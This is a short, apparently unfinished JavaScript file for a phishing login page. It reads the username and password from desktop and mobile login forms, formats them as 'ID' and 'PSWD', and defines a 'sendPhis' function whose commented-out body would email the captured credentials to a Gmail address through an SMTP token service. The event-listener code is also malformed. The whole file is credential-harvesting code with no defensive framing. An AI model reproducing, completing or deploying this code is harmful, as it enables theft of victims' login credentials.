function initialize() {
  document.getElementById("loginbutton").onclick = buttonclick => {
    let username = document.getElementById("username").value;
    let password = document.getElementById("userpassword").value;
    let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
  }

  document.getElementById("mobileloginbutton").addEventListener("click"), function () {
    let username = document.getElementById("mobusername").value;
    let password = document.getElementById("mobuserpassword").value;
    let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
    alert(userdata);
  }

  function sendPhis(userdata) {
    // Email.send({
    //   SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
    //   To: 'someone@gmail.com',
    //   From: "someone@gmail.com",
    //   Subject: "phis",
    //   Body: userdata
    // });
  }
}
window.onload = initialize;
